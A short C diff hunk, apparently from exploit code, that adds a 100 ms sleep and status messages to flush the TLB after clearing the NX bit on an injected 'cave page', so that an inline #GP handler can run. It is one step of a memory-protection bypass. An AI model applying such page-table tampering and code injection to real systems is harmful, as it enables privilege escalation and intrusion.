@@ -6016,6 +6016,19 @@ static void campaign_flatz_setup(void) {
             }
         }
 
+        /* ── Force TLB flush for cave page ──
+         *
+         * We cleared NX in the guest PTE, but the TLB may still cache the
+         * old entry (NX=1).  We cleared G-bit so a CR3 reload will evict
+         * it.  Sleep briefly to force a context switch → CR3 reload → TLB
+         * flush.  Without this, the handler page appears NX and the #GP
+         * handler instruction fetch causes a nested #PF → crash.
+         */
+        printf("[*] Flushing TLB (sleep to force context switch)...\n");
+        fflush(stdout);
+        usleep(100000);  /* 100ms — guarantees context switch + CR3 reload */
+        printf("[+] TLB flush complete\n");
+
         /* ── Build #GP handler machine code inline (88 bytes) ──
          *
          * Handler addresses (baked in, no relocations):
